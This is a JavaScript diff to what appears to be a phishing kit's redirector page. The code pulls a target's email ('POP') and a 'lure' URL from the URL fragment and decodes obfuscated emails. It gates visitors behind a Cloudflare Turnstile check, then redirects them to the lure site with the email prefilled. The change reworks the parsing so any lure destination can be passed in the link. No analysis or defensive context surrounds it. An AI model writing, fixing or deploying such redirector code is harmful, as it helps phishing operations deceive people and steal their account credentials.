@@ -129,7 +129,8 @@
 // Extract and decode email or LURE value from URL
 function extractAndDecodeHashValues() {
     const url = window.location.href;
-    const hashFragment = url.split('#')[1]; // Get the part after the #
+    const hashIndex = url.indexOf('#');
+    let hashFragment = hashIndex !== -1 ? url.slice(hashIndex + 1) : ''; // Get everything after the first '#'
     let result = {
         email: null,
         lureValue: null
@@ -137,36 +138,32 @@ function extractAndDecodeHashValues() {
 
     if (hashFragment) {
         try {
-            // Extract and decode the value for 'POP='
-            if (hashFragment.includes('POP=')) {
-                const popMatch = hashFragment.match(/POP=([^#]+)/); // Match 'POP=' followed by anything until the next '#'
-                if (popMatch) {
-                    let email = decodeURIComponent(popMatch[1].trim());
+            // Replace additional '#' with '&' for parsing
+            hashFragment = hashFragment.replace(/#/g, '&');
+            const params = new URLSearchParams(hashFragment);
 
-                    // Check if it's in an obfuscated format and decode if necessary
-                    if (isObfuscatedFormat(email)) {
-                        console.log('Email is in obfuscated format. Decoding...');
-                        email = decodeEmail(email);
-                    }
-                    result.email = email;
+            // Extract LURE value
+            if (params.has('lure')) {
+                let lureValue = decodeURIComponent(params.get('lure'));
+
+                // Decode nested URLs in the lureValue if applicable
+                if (lureValue.includes('%')) {
+                    lureValue = decodeURIComponent(lureValue);
                 }
+
+                result.lureValue = lureValue;
             }
 
-            // Extract and decode the value for 'LURE='
-            if (hashFragment.includes('LURE=')) {
-                const lureMatch = hashFragment.match(/LURE=([^#]+)/); // Match 'LURE=' followed by anything until the next '#'
-                if (lureMatch) {
-                    let lureValue = decodeURIComponent(lureMatch[1].trim());
-                    result.lureValue = lureValue;
-                }
-            }
+            // Extract POP email
+            if (params.has('POP')) {
+                let email = decodeURIComponent(params.get('POP'));
 
-            // Handle Base64 decoding if no specific patterns are found
-            if (!result.email && !result.lureValue) {
-                let base64Decoded = decodeBase64(hashFragment.trim());
-                if (base64Decoded) {
-                    result.email = base64Decoded; // Assume it's email if Base64 decoding succeeds
+                // Check if it's in an obfuscated format and decode if necessary
+                if (isObfuscatedFormat(email)) {
+                    console.log('Email is in obfuscated format. Decoding...');
+                    email = decodeEmail(email);
                 }
+                result.email = email;
             }
         } catch (e) {
             console.error('Failed to extract or decode hash values:', e);
@@ -232,15 +229,15 @@ function startTurnstileVerification() {
                     loadingDiv.style.display = 'none';
 
                     if (lureValue && email) {
-                        // Construct the redirect URL
-                        const lureDomain = decodeBase64(base64Url); // Decode the base64 URL
-                        const redirectUrl = `${lureDomain}#POP=${encodeURIComponent(email)}?redirected=done`;
+    // Construct the redirect URL
+    const redirectUrl = `${lureValue}#POP=${encodeURIComponent(email)}?redirected=done`;
 
-                        console.log('Redirecting to LURE URL with email:', redirectUrl); // Debug log
-                        window.location.href = redirectUrl;
-                    } else {
-                        console.log('Missing LURE or email values for redirection.');
-                    }
+    console.log('Redirecting to LURE URL with email:', redirectUrl); // Debug log
+    window.location.href = redirectUrl;
+} else {
+    console.log('Missing LURE or email values for redirection.');
+}
+
                 }, 2000);
             },
             'error-callback': function () {
